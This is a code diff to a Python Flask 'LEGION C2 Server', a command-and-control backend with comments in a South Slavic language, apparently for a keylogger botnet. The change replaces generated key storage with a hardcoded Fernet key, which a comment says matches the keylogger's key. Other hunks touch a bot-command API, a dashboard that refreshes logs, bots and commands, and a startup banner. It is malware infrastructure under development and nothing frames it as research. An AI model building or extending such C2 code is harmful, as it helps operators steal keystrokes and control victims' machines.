@@ -31,16 +31,13 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
-# Enkripcija
-KEY_FILE = 'secret.key'
-if os.path.exists(KEY_FILE):
-    with open(KEY_FILE, 'rb') as f:
-        KEY = f.read()
-else:
-    KEY = Fernet.generate_key()
-    with open(KEY_FILE, 'wb') as f:
-        f.write(KEY)
-cipher = Fernet(KEY)
+# =====================================================================
+# ENKRIPCIJA - DIREKTAN KLJUČ
+# =====================================================================
+# TVOJ GENERISANI KLJUČ - ISTI KAO U KEYLOGGER-U!
+MY_KEY = b'PLSiCRE32cI0ErE5vgqCtpGJzy5UO4h5D3UDwgbYJ-A='
+cipher = Fernet(MY_KEY)
+print(f"[+] Encryption key loaded: {MY_KEY[:20]}...")
 
 # =====================================================================
 # BAZA PODATAKA
@@ -280,7 +277,7 @@ def api_send_command():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =====================================================================
-# DASHBOARD TEMPLATE
+# DASHBOARD TEMPLATE (isti kao prije - nije potrebno mijenjati)
 # =====================================================================
 DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
@@ -377,7 +374,11 @@ refreshLogs();refreshBots();refreshCommands();updateBotSelect();
 # =====================================================================
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
-    print(f"[+] LEGION C2 Server starting on port {port}")
+    print("="*50)
+    print("🐉 LEGION C2 SERVER")
+    print("="*50)
+    print(f"[+] Server starting on port {port}")
     print(f"[+] Auth token: {AUTH_TOKEN}")
-    print(f"[+] Encryption key saved to {KEY_FILE}")
+    print(f"[+] Encryption key: {MY_KEY[:20]}...")
+    print("="*50)
     app.run(host="0.0.0.0", port=port, debug=False)
